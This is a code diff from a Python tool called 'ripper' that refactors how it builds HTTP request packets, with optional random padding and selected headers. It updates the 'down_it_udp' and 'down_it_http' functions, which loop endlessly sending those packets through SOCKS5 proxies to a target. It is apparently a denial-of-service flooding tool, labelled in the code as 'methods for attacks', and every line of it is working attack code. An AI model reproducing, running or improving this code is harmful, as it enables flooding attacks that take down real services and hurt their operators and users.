@@ -11,20 +11,28 @@ from ripper.context import Context
 from ripper.statistics import show_statistics
 from ripper.common import get_random_string, get_server_ip_error_msg
 from ripper.proxy import Sock5Proxy
+from ripper.urllib_x import build_request_http_package
 
 
 ###############################################
 # Common methods for attacks
 ###############################################
-def build_request_http_package(_ctx) -> str:
-    packet_txt = f'GET / HTTP/1.1' \
-                 f'\nHost: {_ctx.host}' \
-                 f'\n\n User-Agent: {random.choice(_ctx.user_agents)}' \
-                 f'\n{_ctx.base_headers[0]}'
+def build_ctx_request_http_package(_ctx, is_accept_header_only: bool = True) -> str:
+    local_headers = _ctx.headers
+    if is_accept_header_only:
+        local_headers = {
+            'Accept': _ctx.headers['Accept']
+        }
+
+    extra_data = ''
     if _ctx.max_random_packet_len > 0:
         extra_data = get_random_string(1, _ctx.max_random_packet_len)
-        packet_txt += f'\n\n{extra_data}'
-    return packet_txt.encode('utf-8')
+
+    return build_request_http_package(
+        host=_ctx.host,
+        headers=local_headers,
+        extra_data=extra_data,
+    )
 
 
 def random_proxy_from_context(_ctx) -> Sock5Proxy:
@@ -41,7 +49,7 @@ def down_it_udp(_ctx: Context):
     i = 1
     while True:
         sock = _ctx.sock_manager.get_udp_socket(proxy)
-        request_packet = build_request_http_package(_ctx)
+        request_packet = build_ctx_request_http_package(_ctx)
 
         try:
             sock.sendto(request_packet, (_ctx.host_ip, _ctx.port))
@@ -73,7 +81,7 @@ def down_it_http(_ctx: Context):
         try:
             client = _ctx.sock_manager.create_http_socket(proxy)
             client.connect((_ctx.host, _ctx.port))  
-            request_packet = build_request_http_package(_ctx)
+            request_packet = build_ctx_request_http_package(_ctx)
             client.send(request_packet)
             # 32 chars is enough to get status code
             http_response = repr(client.recv(32))
